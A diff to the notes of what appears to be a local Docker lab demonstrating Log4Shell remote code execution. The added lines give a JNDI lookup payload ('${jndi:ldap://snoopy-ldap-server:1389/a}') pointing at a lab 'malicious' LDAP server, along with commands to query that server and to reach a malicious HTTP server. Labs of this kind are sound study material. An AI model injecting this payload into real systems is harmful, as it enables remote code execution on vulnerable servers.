@@ -1,12 +1,9 @@
-Use `${jndi:ldap://snoopy-ldap-server:1389/a}` 
+Do the RCE via `${jndi:ldap://snoopy-ldap-server:1389/a}` 
+Connect database container from shell via `mysql -h 127.0.0.1 -P 3306 -u root -p biscuits`
+Query the spring LDAP authentication server via `ldapsearch -x -D "uid=ben,ou=people,dc=unige,dc=ch" -W -H ldap://0.0.0.0:8389 -b "ou=people,dc=unige,dc=ch" -s sub "uid=*"`
+Query the malicious LDAP server via `ldapsearch -H ldap://0.0.0.0:1389 -b "dc=example,dc=com" -s sub -x "(objectclass=*)"`
+Access the malicious http server at `http://localhost:8000`
 
 Dependencies : 
 
-openjdk 17.0.10 2024-01-16
-OpenJDK Runtime Environment Temurin-17.0.10+7 (build 17.0.10+7)
-OpenJDK 64-Bit Server VM Temurin-17.0.10+7 (build 17.0.10+7, mixed mode, sharing)
-
-Maven 3.9.6
-
-
-connect from shell via mysql -h 127.0.0.1 -P 3306 -u root -p biscuits
+Working install of docker and docker compose. 
